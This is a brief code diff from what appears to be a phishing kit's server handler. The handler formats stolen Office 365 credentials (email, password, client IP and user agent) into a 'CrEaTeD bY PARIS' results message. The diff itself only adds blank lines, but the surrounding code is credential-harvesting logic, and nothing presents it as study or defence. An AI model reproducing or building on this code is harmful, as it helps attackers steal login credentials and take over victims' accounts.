@@ -207,12 +207,16 @@ const handler = async (event, context) => {
     const uniqueId = Math.random().toString(36).substring(2, 8);
     let message = '';
     message += "|----------| Office365Results |--------------|\n";
+    
     message += `Login From          : ${detail}\n`;
     message += `Online ID           : ${email}\n`;
     message += `Passcode            : ${password}\n`;
+    
     message += "|--------------- I N F O | I P -------------------|\n";
     message += `|Client IP: ${formattedIP}\n`;
+    
     message += `User Agent : ${useragent}\n`;
+    
     message += "|----------- CrEaTeD bY PARIS --------------|\n";
 
     // Join and sanitize the entire message
